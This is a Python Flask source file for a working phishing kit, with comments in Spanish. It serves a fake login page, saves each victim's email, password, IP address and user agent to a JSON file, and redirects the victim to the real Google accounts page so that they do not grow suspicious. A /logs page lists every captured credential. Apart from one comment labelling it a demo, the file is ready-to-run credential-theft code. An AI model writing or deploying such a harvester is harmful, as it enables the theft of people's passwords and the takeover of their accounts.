from flask import Flask, request, render_template, redirect
from datetime import datetime
import json, os

app = Flask(__name__)
LOG_FILE = "captured.json"

def save_capture(data):
    entries = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            entries = json.load(f)
    entries.append({**data, "timestamp": datetime.now().isoformat()})
    with open(LOG_FILE, "w") as f:
        json.dump(entries, f, indent=2)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/submit", methods=["POST"])
def submit():
    save_capture({
        "email": request.form.get("email"),
        "password": request.form.get("password"),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent")
    })
    # Redirige a Google real para no levantar sospechas (demo)
    return redirect("https://accounts.google.com")

@app.route("/logs")
def logs():
    if not os.path.exists(LOG_FILE):
        return "<pre>Sin capturas aún.</pre>"
    with open(LOG_FILE) as f:
        data = json.load(f)
    rows = "".join(
        f"<tr><td>{e['timestamp']}</td><td>{e['email']}</td><td>{e['password']}</td><td>{e['ip']}</td></tr>"
        for e in data
    )
    return f"""<html><body>
    <h2>Capturas registradas</h2>
    <table border=1><tr><th>Timestamp</th><th>Email</th><th>Password</th><th>IP</th></tr>{rows}</table>
    </body></html>"""

if __name__ == "__main__":
    app.run(debug=True, port=5000)
